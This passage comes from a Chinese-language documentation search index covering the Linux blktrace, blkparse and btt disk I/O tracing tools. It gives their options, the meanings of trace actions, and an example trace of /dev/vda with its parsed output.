blktrace\u533a\u5206\u4e24\u79cd\u7c7b\u578b\u7684\u5757\u5c42\u8bf7\u6c42\uff0c\u6587\u4ef6\u7cfb\u7edf\u548cSCSI\u547d\u4ee4\u3002\u524d\u8005\u79f0\u4e3afs\u8bf7\u6c42\uff0c\u540e\u8005\u79f0\u4e3apc\u8bf7\u6c42\u3002\u6587\u4ef6\u7cfb\u7edf\u8bf7\u6c42\u662f\u6b63\u5e38\u7684\u8bfb/\u5199\u64cd\u4f5c\uff0c\u5373\u4ee5\u7ed9\u5b9a\u5927\u5c0f\u4ece\u7279\u5b9a\u78c1\u76d8\u4f4d\u7f6e\u8fdb\u884c\u4efb\u4f55\u7c7b\u578b\u7684\u8bfb\u6216\u5199\u64cd\u4f5c\u3002\u8fd9\u4e9b\u8bf7\u6c42\u901a\u5e38\u6765\u81ea\u7528\u6237\u8fdb\u7a0b\uff0c\u4f46\u4e5f\u53ef\u80fd\u7531vm\u5c06\u810f\u6570\u636e\u5237\u65b0\u5230\u78c1\u76d8\u6216\u6587\u4ef6\u7cfb\u7edf\u5c06\u8d85\u7ea7\u6216\u65e5\u5fd7\u5757\u540c\u6b65\u5230\u78c1\u76d8\u6765\u542f\u52a8\u3002pc\u8bf7\u6c42\u662fSCSI\u547d\u4ee4\u3002blktrace\u5c06\u547d\u4ee4\u6570\u636e\u5757\u4f5c\u4e3a\u6709\u6548\u8f7d\u8377\u53d1\u9001\uff0c\u4ee5\u4fbfblkparse\u53ef\u4ee5\u5bf9\u5176\u8fdb\u884c\u89e3\u7801\u3002","title":"\u4e00\u4e9b\u8be6\u7ec6\u7684\u89e3\u91ca"},{"location":"system/linux/IO/blktrace/#_4","text":"\u8981\u8ddf\u8e2a\u8bbe\u5907/ dev/sda \u4e0a\u7684 I/O \u5e76\u5c06\u8f93\u51fa\u89e3\u6790\u4e3a\u4eba\u7c7b\u53ef\u8bfb\u7684\u5f62\u5f0f\uff0c\u8bf7\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff1a $ blktrace -d /dev/sda -o - |blkparse -i -","title":"\u4e3e\u4f8b"},{"location":"system/linux/IO/blktrace/#blkparse","text":"","title":"blkparse\u547d\u4ee4"},{"location":"system/linux/IO/blktrace/#_5","text":"blkparse [\u9009\u9879]","title":"\u8bed\u6cd5"},{"location":"system/linux/IO/blktrace/#_6","text":"$ blkparse Usage: blkparse -i <file> | --input=<file> \u5fc5\u586b\u9009\u9879\uff0c\u9009\u5b9ablktrace\u7684\u8f93\u51fa\u6587\u4ef6 [ -a <action field> | --act-mask=<action field> ] \u8fc7\u6ee4\u67e5\u770b\u54ea\u79cdIO\u7c7b\u578b [ -A <action mask> | --set-mask=<action mask> ] \u901a\u8fc716\u4f4d\u63a9\u7801\u8bbe\u7f6e\u8fc7\u6ee4\u54ea\u79cd\u78c1\u76d8\u884c\u4e3a [ -b <traces> | --batch=<traces> ] \u6807\u51c6\u8f93\u5165\u8bfb\u53d6 [ -d <file> | --dump-binary=<file> ] \u4e8c\u8fdb\u5236\u8f93\u51fa\u6587\u4ef6 [ -D <dir> | --input-directory=<dir> ] blktrace\u7684\u8f93\u51fa\u6587\u4ef6\u7684\u76ee\u5f55 [ -f <format> | --format=<format> ] \u8f93\u51fa\u7684\u683c\u5f0f\uff0c\u53ef\u4ee5\u81ea\u5b9a\u4e49\u8f93\u51fa\u54ea\u4e9b\u5217 [ -F <spec> | --format-spec=<spec> ] \u683c\u5f0f\u89c4\u8303\uff0c\u53ef\u4ee5\u81ea\u5b9a\u4e49 [ -h | --hash-by-name ] \u6309\u540d\u5b57\u8fdb\u884chash [ -o <file> | --output=<file> ] \u8f93\u51fa\u6587\u4ef6 [ -O | --no-text-output ] \u65e0\u6587\u672c\u8f93\u51fa [ -q | --quiet ] \u9759\u9ed8\u8f93\u51fa [ -s | --per-program-stats ] \u6bcf\u4e2a\u7a0b\u5e8f\u7684\u7edf\u8ba1\u4fe1\u606f [ -t | --track-ios ] \u5c06\u544a\u8bc9\u60a8\u8bf7\u6c42\u6392\u961f\u3001\u8c03\u5ea6\u548c\u5b8c\u6210\u6240\u9700\u7684\u65f6\u95f4 [ -w <time> | --stopwatch=<time> ] \u4ec5\u5206\u6790\u7ed9\u5b9a\u65f6\u95f4\u95f4\u9694\u4e4b\u95f4\u7684\u6570\u636e\uff08\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff09\uff0c\u5982\u679c\u672a\u7ed9\u5b9a\u201cstart\u201d\uff0cblkparse\u9ed8\u8ba4\u5f00\u59cb\u65f6\u95f4\u4e3a0 [ -M | --no-msgs \u4e0d\u5c06\u6d88\u606f\u8f93\u51fa\u5230\u4e8c\u8fdb\u5236\u6587\u4ef6 [ -v | --verbose ] \u8be6\u7ec6\u8f93\u51fa [ -V | --version ] \u8f93\u51fa\u7248\u672c -a \u8fc7\u6ee4\u67e5\u770b\u54ea\u79cdIO\u7c7b\u578b -A \u901a\u8fc716\u4f4d\u63a9\u7801\u8bbe\u7f6e\u8fc7\u6ee4\u54ea\u79cd\u78c1\u76d8\u884c\u4e3a -b \u6807\u51c6\u8f93\u5165\u8bfb\u53d6 -d \u4e8c\u8fdb\u5236\u8f93\u51fa\u6587\u4ef6 -D blktrace\u7684\u8f93\u51fa\u6587\u4ef6\u7684\u76ee\u5f55 -f \u8f93\u51fa\u7684\u683c\u5f0f\uff0c\u53ef\u4ee5\u81ea\u5b9a\u4e49\u8f93\u51fa\u54ea\u4e9b\u5217 -F \u683c\u5f0f\u89c4\u8303\uff0c\u53ef\u4ee5\u81ea\u5b9a\u4e49 -h \u6309\u8fdb\u7a0b\u540d\u5b57\u6392\u5e8f\u800c\u4e0d\u662fpid -i \u5fc5\u586b\u9009\u9879\uff0c\u9009\u5b9ablktrace\u7684\u8f93\u51fa\u6587\u4ef6, \u6216\u8005\u52a0 - \u8ddfblktrace\u547d\u4ee4\u884c\u8f93\u51fa -o \u8f93\u51fa\u6587\u4ef6\u3002\u5982\u679c\u672a\u7ed9\u51fa\uff0c\u5219\u8f93\u51fa\u4e3a\u6807\u51c6\u8f93\u51fa -O \u65e0\u6587\u672c\u8f93\u51fa -q \u9759\u9ed8\u8f93\u51fa -s \u663e\u793a\u6bcf\u4e2a\u7a0b\u5e8f\u7684io\u7edf\u8ba1\u4fe1\u606f -t \u5c06\u544a\u8bc9\u60a8\u8bf7\u6c42\u6392\u961f\u3001\u8c03\u5ea6\u548c\u5b8c\u6210\u6240\u9700\u7684\u65f6\u95f4 -w \u4ec5\u5206\u6790\u7ed9\u5b9a\u65f6\u95f4\u95f4\u9694\u4e4b\u95f4\u7684\u6570\u636e\uff08\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff09\uff0c\u5982\u679c\u672a\u7ed9\u5b9a\u201cstart\u201d\uff0cblkparse\u9ed8\u8ba4\u5f00\u59cb\u65f6\u95f4\u4e3a0 -M \u4e0d\u5c06\u6d88\u606f\u8f93\u51fa\u5230\u4e8c\u8fdb\u5236\u6587\u4ef6 -v \u8be6\u7ec6\u8f93\u51fa -V \u8f93\u51fa\u7248\u672c TRACE ACTIONS \u8bc6\u522b\u4ee5\u4e0b\u8ddf\u8e2a\uff1a C -- complete A previously issued request has been completed. The output will detail the sector and size of that request, as well as the success or failure of it. D -- issued A request that previously resided on the block layer queue or in the i/o scheduler has been sent to the driver. I -- inserted A request is being sent to the i/o scheduler for addition to the internal queue and later service by the driver. The request is fully formed at this time. Q -- queued This notes intent to queue i/o at the given location. No real requests exists yet. B -- bounced The data pages attached to this bio are not reachable by the hardware and must be bounced to a lower memory location. This causes a big slowdown in i/o performance, since the data must be copied to/from kernel buffers. Usually this can be fixed with using better hardware -- either a better i/o controller, or a platform with an IOMMU. M -- back merge A previously inserted request exists that ends on the boundary of where this i/o begins, so the i/o scheduler can merge them together. F -- front merge Same as the back merge, except this i/o ends where a previously inserted requests starts. M --front or back merge One of the above M -- front or back merge One of the above. G -- get request To send any type of request to a block device, a struct request container must be allocated first. S -- sleep No available request structures were available, so the issuer has to wait for one to be freed. P -- plug When i/o is queued to a previously empty block device queue, Linux will plug the queue in anticipation of future ios being added before this data is needed. U -- unplug Some request data already queued in the device, start sending requests to the driver. This may happen automatically if a timeout period has passed (see next entry) or if a number of requests have been added to the queue. T -- unplug due to timer If nobody requests the i/o that was queued after plugging the queue, Linux will automatically unplug it after a defined period has passed. X -- split On raid or device mapper setups, an incoming i/o may straddle a device or internal zone and needs to be chopped up into smaller pieces for service. This may indicate a performance problem due to a bad setup of that raid/dm device, but may also just be part of normal boundary conditions. dm is notably bad at this and will clone lots of i/o. A -- remap For stacked devices, incoming i/o is remapped to device below it in the i/o stack. The remap action details what exactly is being remapped to what. \u8f93\u51fa\u8bf4\u660e blkparse\u7684\u8f93\u51fa\u53ef\u4ee5\u9488\u5bf9\u7279\u5b9a\u7528\u9014\u8fdb\u884c\u5b9a\u5236\uff0c\u7279\u522b\u662f\u4e3a\u4e86\u7b80\u5316\u8f93\u51fa\u89e3\u6790\uff0c\u548c/\u6216\u5c06\u8f93\u51fa\u5b57\u6bb5\u9650\u5236\u4e3a\u7528\u6237\u5e0c\u671b\u770b\u5230\u7684\u5b57\u6bb5\u3002\u53ef\u8f93\u51fa\u7684\u5b57\u6bb5\u6570\u636e\u5305\u62ec\uff1a a Action, a (small) string (1 or 2 characters) -- see table below for more details c CPU id C Command d RWBS field, a (small) string (1-3 characters) -- see section below for more details D 7-character string containing the major and minor numbers of the event's device (separated by a comma). e Error value m Minor number of event's device. M Major number of event's device. n Number of blocks N Number of bytes p Process ID P Display packet data -- series of hexadecimal values s Sequence numbers S Sector number t Time stamp (nanoseconds) T Time stamp (seconds) u Elapsed value in microseconds (-t command line option) U Payload unsigned integer \u6ce8\u610f\uff0c\u7528\u6237\u53ef\u4ee5\u9009\u62e9\u6307\u5b9a\u5b57\u6bb5\u663e\u793a\u5bbd\u5ea6\uff0c\u4e5f\u53ef\u4ee5\u9009\u62e9\u5de6\u5bf9\u9f50\u8bf4\u660e\u7b26\u3002\u5b83\u4eec\u4f4d\u4e8e\u5b57\u6bb5\u8bf4\u660e\u7b26\u4e4b\u524d\uff0c\u540e\u8ddf\u201c%\u201d\u5b57\u7b26\uff0c\u540e\u8ddf\u53ef\u9009\u7684\u5de6\u5bf9\u9f50\u8bf4\u660e\u7b26\uff08-\uff09\uff0c\u540e\u8ddf\u5bbd\u5ea6\uff08\u5341\u8fdb\u5236\u6570\uff09\uff0c\u7136\u540e\u662f\u5b57\u6bb5\u3002 \u56e0\u6b64\uff0c\u8981\u5728\u5de6\u5bf9\u9f50\u768412\u4e2a\u5b57\u7b26\u5b57\u6bb5\u4e2d\u6307\u5b9a\u547d\u4ee4\uff1a -f \"%-12C\" \u6307\u5b9a\u6bcf\u5217\u8f93\u51fa % blkparse -f \"%a %c %C %d %n %p %s %S %t \\n\" -i myvda \"%a\u8f93\u51fa\u5217\u4e2d\u6bcf\u4e2a\u5b57\u6bcd\u7684\u542b\u4e49 A IO was remapped to a different device B IO bounced C IO completion D IO issued to driver F IO front merged with request on queue G Get request I IO inserted onto request queue M IO back merged with request on queue P Plug request Q IO handled by request queue code S Sleep request T Unplug due to timeout U Unplug request X Split %d \u8f93\u51fa\u5217\u4e2d\u6bcf\u4e2a\u5b57\u6bcd\u7684\u542b\u4e49 \u8fd9\u662f\u4e00\u4e2a\u5c0f\u5b57\u7b26\u4e32\uff0c\u81f3\u5c11\u5305\u542b\u4e00\u4e2a\u5b57\u7b26\uff08\u201cR\u201d\u8868\u793a\u8bfb\u53d6\uff0c\u201cW\u201d\u8868\u793a\u5199\u5165\uff0c\u201cD\u201d\u8868\u793a\u5757\u4e22\u5f03\u64cd\u4f5c\uff09\uff0c\u4ee5\u53ca\u53ef\u9009\u7684\u201cB\u201d\uff08\u8868\u793a\u5c4f\u969c\u64cd\u4f5c\uff09\u6216\u201cS\u201d\uff08\u8868\u793a\u540c\u6b65\u64cd\u4f5c\uff09\u3002 \u9ed8\u8ba4\u8f93\u51fa \u6807\u51c6\u6807\u9898\u5305\u542b\u4e0b\u5217\u6807\u9898\uff1a \"%D %2c %8s %5T.%9t %5p %2a %3d\"","title":"\u547d\u4ee4\u9009\u9879"},{"location":"system/linux/IO/blktrace/#btt","text":"","title":"btt\u547d\u4ee4"},{"location":"system/linux/IO/blktrace/#_7","text":"btt [\u9009\u9879]","title":"\u8bed\u6cd5"},{"location":"system/linux/IO/blktrace/#_8","text":"[ -a | --seek-absolute ] [ -A | --all-data ] \u901a\u5e38\uff0cbtt\u4e0d\u4f1a\u6253\u5370\u6709\u5173\u6bcf\u4e2a\u8fdb\u7a0b\u548c\u6bcf\u4e2a\u8bbe\u5907\u6570\u636e\u7684\u8be6\u7ec6\u4fe1\u606f\u3002\u5982\u679c\u9700\u8981\u8be5\u8be6\u7ec6\u7ea7\u522b\uff0c\u53ef\u4ee5\u6307\u5b9a\u6b64\u9009\u9879\u3002 [ -B <output name> | --dump-blocknos=<output name> ] \u6b64\u9009\u9879\u5c06\u4ee5\u6307\u5b9a\u7684\u8f93\u51fa\u540d\u79f0\u4e3a\u524d\u7f00\u5411\u4e09\u4e2a\u6587\u4ef6\u8f93\u51fa\u7edd\u5bf9\u5757\u53f7 [ -d <seconds> | --range-delta=<seconds> ] btt\u8f93\u51fa\u4e00\u4e2a\u5305\u542bQ\u548cC\u6d3b\u52a8\u7684\u6587\u4ef6\uff0c\u6d3b\u52a8\u8ddf\u8e2a\u7684\u6982\u5ff5\u7b80\u5355\u5730\u610f\u5473\u7740\u5728\u5f7c\u6b64\u7684\u67d0\u4e2a\u65f6\u95f4\u6bb5\u5185\u5b58\u5728Q\u6216C\u8ddf\u8e2a\u3002\u9ed8\u8ba4\u503c\u4e3a0.1\u79d2\uff1b\u8be5\u9009\u9879\u5141\u8bb8\u60a8\u66f4\u6539\u7c92\u5ea6\u3002\u503c\u8d8a\u5c0f\uff0c\u63d0\u4f9b\u7684\u6570\u636e\u70b9\u8d8a\u591a\u3002 [ -D <dev;...> | --devices=<dev;...> ] \u901a\u5e38\uff0cbtt\u5c06\u4e3a\u5728\u5206\u6790\u7684\u8ddf\u8e2a\u4e2d\u68c0\u6d4b\u5230\u7684\u6240\u6709\u8bbe\u5907\u751f\u6210\u6570\u636e\u3002\u4f7f\u7528\u6b64\u9009\u9879\uff0c\u53ef\u4ee5\u5c06\u5206\u6790\u51cf\u5c11\u5230\u4f20\u9012\u7ed9\u6b64\u9009\u9879\u7684\u5b57\u7b26\u4e32\u4e2d\u63d0\u4f9b\u7684\u4e00\u4e2a\u6216\u591a\u4e2a\u8bbe\u5907 [ -e <exe,...> | --exes=<exe,...> ] -e\u9009\u9879\u63d0\u4f9b\u5c06\u5206\u6790I/O\u7684\u53ef\u6267\u884c\u6587\u4ef6\u5217\u8868\u3002 [ -h | --help ] \u6253\u5370\u6b64\u5e2e\u52a9 [ -i <input name> | --input-file=<input name> ] \u6307\u5b9a\u8f93\u5165\u6587\u4ef6 [ -I <output name> | --iostat=<output name> ] -I\u9009\u9879\u6307\u793abtt\u5c06\u7c7b\u4f3ciostat\u7684\u6570\u636e\u8f93\u51fa\u5230\u6307\u5b9a\u7684\u6587\u4ef6\u3002\u6709\u5173\u6570\u636e\u5217\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605iostat\uff08sysstat\uff09\u6587\u6863\u3002 [ -l <output name> | --d2c-latencies=<output name> ] -l\u9009\u9879\u5141\u8bb8\u5206\u522b\u8f93\u51fa\u6bcf\u4e2aIO D2C\u5ef6\u8fdf\u3002\u63d0\u4f9b\u7684\u53c2\u6570\u4e3a\u6bcf\u4e2a\u8bbe\u5907\u7684\u8f93\u51fa\u540d\u79f0\u63d0\u4f9b\u4e86\u57fa\u7840\u3002 [ -L <freq> | --periodic-latencies=<freq> ] -L\u9009\u9879\u5141\u8bb8\u8f93\u51faQ2C\u548cD2C\u5ef6\u8fdf\u7684\u5468\u671f\u6027\u5ef6\u8fdf\u4fe1\u606f\u3002\u6307\u5b9a\u7684\u9891\u7387\u5c06\u8c03\u8282\u8f93\u51fa\u5e73\u5747\u5ef6\u8fdf\u7684\u9891\u7387\u2014\u2014\u8868\u793a\u79d2\u7684\u6d6e\u70b9\u503c\u3002 [ -m <output name> | --seeks-per-second=<output name> ] \u89e6\u53d1btt\u4ee5\u8f93\u51fa\u6bcf\u79d2\u5bfb\u9053\u4fe1\u606f\u3002\u7b2c\u4e00\u5217\u5c06\u5305\u542b\u65f6\u95f4\u503c\uff08\u79d2\uff09\uff0c\u7b2c\u4e8c\u5217\u5c06\u6307\u793a\u6b64\u65f6\u6bcf\u79d2\u7684\u5bfb\u9053\u6b21\u6570\u3002 [ -M <dev map> | --dev-maps=<dev map> [ -o <output name> | --output-file=<output name> ] \u6307\u5b9a\u8f93\u51fa\u6587\u4ef6\u540d\u3002 [ -p <output name> | --per-io-dump=<output name> ] -p\u9009\u9879\u5c06\u751f\u6210\u4e00\u4e2a\u5305\u542b\u6240\u6709IO\u201c\u5e8f\u5217\u201d\u5217\u8868\u7684\u6587\u4ef6\uff0c\u663e\u793a\u6bcf\u4e2aIO\u7684\u90e8\u5206\uff08Q\u3001a\u3001I/M\u3001D\u548cC\uff09\u3002 [ -P <output name> | --per-io-trees=<output name> ] -P\u9009\u9879\u5c06\u751f\u6210\u4e00\u4e2a\u5305\u542b\u6240\u6709IO\u201c\u5e8f\u5217\u201d\u5217\u8868\u7684\u6587\u4ef6\uff0c\u4ec5\u663e\u793aQ\u3001D\u548cC\u64cd\u4f5c\u65f6\u95f4\u3002D&C\u65f6\u95f4\u503c\u4e0eQ\u65f6\u95f4\u503c\u7528\u7ad6\u6761\u9694\u5f00\u3002 [ -q <output name> | --q2c-latencies=<output name> ] -q\u9009\u9879\u5141\u8bb8\u5206\u522b\u8f93\u51fa\u6bcf\u4e2aIO Q2C\u5ef6\u8fdf\u3002\u63d0\u4f9b\u7684\u53c2\u6570\u4e3a\u6bcf\u4e2a\u8bbe\u5907\u7684\u8f93\u51fa\u540d\u79f0\u63d0\u4f9b\u4e86\u57fa\u7840\u3002 [ -Q <output name> | --active-queue-depth=<output name> ] -Q\u9009\u9879\u5141\u8bb8\u8f93\u51fa\u663e\u793a\u65f6\u95f4\u6233\u548c\u6d3b\u52a8\u547d\u4ee4\u6df1\u5ea6\uff08\u5df2\u53d1\u51fa\u4f46\u5c1a\u672a\u5b8c\u6210\u7684\u547d\u4ee4\uff09\u7684\u6570\u636e\u6587\u4ef6\u3002 [ -r | --no-remaps ] \u5ffd\u7565\u91cd\u6620\u5c04\u8ddf\u8e2a\uff1b\u8f83\u65e7\u7684\u5185\u6838\u6ca1\u6709\u5b9e\u73b0\u5b8c\u6574\u7684\u91cd\u6620\u5c04PDU\u3002 [ -s <output name> | --seeks=<output name> ] -s\u9009\u9879\u6307\u793abtt\u8f93\u51fa\u641c\u7d22\u6570\u636e\uff0c\u63d0\u4f9b\u7684\u53c2\u6570\u662f\u6587\u4ef6\u540d\u8f93\u51fa\u7684\u57fa\u7840\u3002\u6bcf\u4e2a\u8bbe\u5907\u6709\u4e24\u4e2a\u6587\u4ef6\uff0c\u8bfb\u67e5\u627e\u548c\u5199\u67e5\u627e\u3002 [ -S <interval> | --iostat-interval=<interval> ] -S\u9009\u9879\u6307\u5b9a\u6570\u636e\u8f93\u51fa\u4e4b\u95f4\u4f7f\u7528\u7684\u95f4\u9694\uff0c\u9ed8\u8ba4\u4e3a\u6bcf\u79d2\u4e00\u6b21\u3002 [ -t <sec> | --time-start=<sec> ] \u5206\u6790\u7684\u5f00\u59cb\u65f6\u95f4 [ -T <sec> | --time-end=<sec> ] \u5206\u6790\u7684\u7ed3\u675f\u65f6\u95f4 [ -u <output name> | --unplug-hist=<output name> ] \u8f93\u51fa\u76f4\u65b9\u56fe [ -V | --version ] \u7248\u672c\u4fe1\u606f [ -v | --verbose ] \u8be6\u7ec6\u4fe1\u606f [ -X | --easy-parse-avgs ] \u4ee5\u6613\u4e8e\u89e3\u6790\u7684\u5f62\u5f0f\u63d0\u4f9b\u6570\u636e\uff0c\u5e76\u5c06\u5176\u5199\u5165\u5e26\u6709.avg exentsion\u7684\u6587\u4ef6 [ -z <output name> | --q2d-latencies=<output name> ] -z\u9009\u9879\u5141\u8bb8\u5206\u522b\u8f93\u51fa\u6bcf\u4e2aIO Q2D\u5ef6\u8fdf\u3002\u63d0\u4f9b\u7684\u53c2\u6570\u4e3a\u6bcf\u4e2a\u8bbe\u5907\u7684\u8f93\u51fa\u540d\u79f0\u63d0\u4f9b\u4e86\u57fa\u7840\u3002 [ -Z | --do-active -Z\u5c06\u8f93\u51fa\u5305\u542b\u6570\u636e\u7684\u6587\u4ef6\uff0c\u8fd9\u4e9b\u6570\u636e\u53ef\u4ee5\u7ed8\u5236\u4e3a\u663e\u793a\u6bcf\u4e2a\u8bbe\u5907\uff08\u548c\u6574\u4e2a\u7cfb\u7edf\uff09\u7684I/O\u6d3b\u52a8\u3002 \u8ffd\u8e2avda\u78c1\u76d810\u79d2\u949f\uff0c\u6307\u5b9a\u76ee\u5f55\u5230mydata\uff0c\u6587\u4ef6\u540d\u4e3amyvda\uff0cblkparse \u6307\u5b9a\u8f93\u5165myvda \uff0c\u8f93\u51fa\u4e8c\u8fdb\u5236\u62a5\u544a\u5728myvdabin\u4e2d\uff0cbtt \u8f93\u5165\u4e8c\u8fdb\u5236\u62a5\u544amyvdabin\uff0c\u8f93\u51faiostat\u4fe1\u606f\u5728iostatreport\u4e2d\uff0c\u62a5\u544a\u6253\u5370\u5728\u5c4f\u5e55\u4e0a [root@VM-0-16-centos blk]# blktrace -d /dev/vda -w 10 -D mydata -o myvda === vda === CPU 0: 391 events, 19 KiB data CPU 1: 246 events, 12 KiB data CPU 2: 0 events, 0 KiB data CPU 3: 17 events, 1 KiB data Total: 654 events (dropped 0), 31 KiB data [root@VM-0-16-centos blk]# ls mydata [root@VM-0-16-centos blk]# cd mydata/ [root@VM-0-16-centos mydata]# ls myvda.blktrace.0 myvda.blktrace.1 myvda.blktrace.2 myvda.blktrace.3 [root@VM-0-16-centos mydata]# blkparse -i myvda -d myvdabin Input file myvda.blktrace.0 added Input file myvda.blktrace.1 added Input file myvda.blktrace.2 added 253,0 0 1 0.000000000 31360 A WS 18285248 + 8 <- (253,1) 18283200 253,0 0 2 0.000002963 31360 Q WS 18285248 + 8 [barad_agent] 253,0 0 3 0.000005948 31360 G WS 18285248 + 8 [barad_agent] 253,0 0 4 0.000008960 31360 P N [barad_agent] 253,0 0 5 0.000011457 31360 UT N [barad_agent] 1 253,0 0 6 0.000012926 31360 I WS 18285248 + 8 [barad_agent] 253,0 0 7 0.000016476 31360 D WS 18285248 + 8 [barad_agent] 253,0 0 8 0.000910827 0 C WS 18285248 + 8 [0] 253,0 1 1 0.000960226 291 A WS 7928704 + 8 <- (253,1) 7926656 253,0 1 2 0.000961174 291 Q WS 7928704 + 8 [jbd2/vda1-8] 253,0 1 3 0.000962002 291 G WS 7928704 + 8 [jbd2/vda1-8] 253,0 1 4 0.000963025 291 P N [jbd2/vda1-8] 253,0 1 5 0.000963520 291 A WS 7928712 + 8 <- (253,1) 7926664 253,0 1 6 0.000963743 291 Q WS 7928712 + 8 [jbd2/vda1-8] 253,0 1 7 0.000964425 291 M WS 7928712 + 8 [jbd2/vda1-8] 253,0 1 8 0.000964942 291 A WS 7928720 + 8 <- (253,1) 7926672 253,0 1 9 0.000965136 291 Q WS 7928720 + 8 [jbd2/vda1-8] 253,0 1 10 0.000965273 291 M WS 7928720 + 8 [jbd2/vda1-8] 253,0 1 11 0.000965616 291 A WS 7928728 + 8 <- (253,1) 7926680 253,0 1 12 0.000965733 291 Q WS 7928728 + 8 [jbd2/vda1-8] 253,0 1 13 0.000965867 291 M WS 7928728 + 8 [jbd2/vda1-8] 253,0 1 14 0.000966134 291 A WS 7928736 + 8 <- (253,1) 7926688 253,0 1 15 0.000966253 291 Q WS 7928736 + 8 [jbd2/vda1-8] 253,0 1 16 0.000966385 291 M WS 7928736 + 8 [jbd2/vda1-8] 253,0 1 17 0.000966664 291 A WS 7928744 + 8 <- (253,1) 7926696 253,0 1 18 0.000966781 291 Q WS 7928744 + 8 [jbd2/vda1-8] 253,0 1 19 0.000966910 291 M WS 7928744 + 8 [jbd2/vda1-8] 253,0 1 20 0.000967197 291 A WS 7928752 + 8 <- (253,1) 7926704 253,0 1 21 0.000967316 291 Q WS 7928752 + 8 [jbd2/vda1-8] 253,0 1 22 0.000967450 291 M WS 7928752 + 8 [jbd2/vda1-8] 253,0 1 23 0.000967645 291 A WS 7928760 + 8 <- (253,1) 7926712 253,0 1 24 0.000967763 291 Q WS 7928760 + 8 [jbd2/vda1-8] 253,0 1 25 0.000967894 291 M WS 7928760 + 8 [jbd2/vda1-8] 253,0 1 26 0.000968162 291 A WS 7928768 + 8 <- (253,1) 7926720 253,0 1 27 0.000968281 291 Q WS 7928768 + 8 [jbd2/vda1-8] 253,0 1 28 0.000968411 291 M WS 7928768 + 8 [jbd2/vda1-8] 253,0 1 29 0.000968771 291 A WS 7928776 + 8 <- (253,1) 7926728 253,0 1 30 0.000968894 291 Q WS 7928776 + 8 [jbd2/vda1-8] 253,0 1 31 0.000969027 291 M WS 7928776 + 8 [jbd2/vda1-8] 253,0 1 32 0.000969474 291 A WS 7928784 + 8 <- (253,1) 7926736 253,0 1 33 0.000969599 291 Q WS 7928784 + 8 [jbd2/vda1-8] 253,0 1 34 0.000969731 291 M WS 7928784 + 8 [jbd2/vda1-8] 253,0 1 35 0.000970010 291 A WS 7928792 + 8 <- (253,1) 7926744 253,0 1 36 0.000970129 291 Q WS 7928792 + 8 [jbd2/vda1-8] 253,0 1 37 0.000970259 291 M WS 7928792 + 8 [jbd2/vda1-8] 253,0 1 38 0.000970541 291 A WS 7928800 + 8 <- (253,1) 7926752 253,0 1 39 0.000970665 291 Q WS 7928800 + 8 [jbd2/vda1-8] 253,0 1 40 0.000970796 291 M WS 7928800 + 8 [jbd2/vda1-8] 253,0 1 41 0.000971068 291 A WS 7928808 + 8 <- (253,1) 7926760 253,0 1 42 0.000971188 291 Q WS 7928808 + 8 [jbd2/vda1-8] 253,0 1 43 0.000971317 291 M WS 7928808 + 8 [jbd2/vda1-8] 253,0 1 44 0.000971590 291 A WS 7928816 + 8 <- (253,1) 7926768 253,0 1 45 0.000971710 291 Q WS 7928816 + 8 [jbd2/vda1-8] 253,0 1 46 0.000971841 291 M WS 7928816 + 8 [jbd2/vda1-8] 253,0 1 47 0.000972114 291 A WS 7928824 + 8 <- (253,1) 7926776 253,0 1 48 0.000972234 291 Q WS 7928824 + 8 [jbd2/vda1-8] 253,0 1 49 0.000972363 291 M WS 7928824 + 8 [jbd2/vda1-8] 253,0 1 50 0.000972626 291 A WS 7928832 + 8 <- (253,1) 7926784 253,0 1 51 0.000972819 291 Q WS 7928832 + 8 [jbd2/vda1-8] 253,0 1 52 0.000972952 291 M WS 7928832 + 8 [jbd2/vda1-8] 253,0 1 53 0.000973204 291 A WS 7928840 + 8 <- (253,1) 7926792 253,0 1 54 0.000973397 291 Q WS 7928840 + 8 [jbd2/vda1-8] 253,0 1 55 0.000973527 291 M WS 7928840 + 8 [jbd2/vda1-8] 253,0 1 56 0.000973751 291 A WS 7928848 + 8 <- (253,1) 7926800 253,0 1 57 0.000973930 291 Q WS 7928848 + 8 [jbd2/vda1-8] 253,0 1 58 0.000974059 291 M WS 7928848 + 8 [jbd2/vda1-8] 253,0 1 59 0.000974318 291 A WS 7928856 + 8 <- (253,1) 7926808 253,0 1 60 0.000974500 291 Q WS 7928856 + 8 [jbd2/vda1-8] 253,0 1 61 0.000974633 291 M WS 7928856 + 8 [jbd2/vda1-8] 253,0 1 62 0.000974857 291 A WS 7928864 + 8 <- (253,1) 7926816 253,0 1 63 0.000974977 291 Q WS 7928864 + 8 [jbd2/vda1-8] 253,0 1 64 0.000975108 291 M WS 7928864 + 8 [jbd2/vda1-8] 253,0 1 65 0.000975302 291 A WS 7928872 + 8 <- (253,1) 7926824 253,0 1 66 0.000975418 291 Q WS 7928872 + 8 [jbd2/vda1-8] 253,0 1 67 0.000975547 291 M WS 7928872 + 8 [jbd2/vda1-8] 253,0 1 68 0.000976171 291 A WS 7928880 + 8 <- (253,1) 7926832 253,0 1 69 0.000976289 291 Q WS 7928880 + 8 [jbd2/vda1-8] 253,0 1 70 0.000976421 291 M WS 7928880 + 8 [jbd2/vda1-8] 253,0 1 71 0.000976707 291 A WS 7928888 + 8 <- (253,1) 7926840 253,0 1 72 0.000976823 291 Q WS 7928888 + 8 [jbd2/vda1-8] 253,0 1 73 0.000976951 291 M WS 7928888 + 8 [jbd2/vda1-8] 253,0 1 74 0.000977235 291 A WS 7928896 + 8 <- (253,1) 7926848 253,0 1 75 0.000977351 291 Q WS 7928896 + 8 [jbd2/vda1-8] 253,0 1 76 0.000977493 291 M WS 7928896 + 8 [jbd2/vda1-8] 253,0 1 77 0.000977886 291 A WS 7928904 + 8 <- (253,1) 7926856 253,0 1 78 0.000978066 291 Q WS 7928904 + 8 [jbd2/vda1-8] 253,0 1 79 0.000978199 291 M WS 7928904 + 8 [jbd2/vda1-8] 253,0 1 80 0.000978496 291 A WS 7928912 + 8 <- (253,1) 7926864 253,0 1 81 0.000978675 291 Q WS 7928912 + 8 [jbd2/vda1-8] 253,0 1 82 0.000978806 291 M WS 7928912 + 8 [jbd2/vda1-8] 253,0 1 83 0.000979050 291 A WS 7928920 + 8 <- (253,1) 7926872 253,0 1 84 0.000979244 291 Q WS 7928920 + 8 [jbd2/vda1-8] 253,0 1 85 0.000979373 291 M WS 7928920 + 8 [jbd2/vda1-8] 253,0 1 86 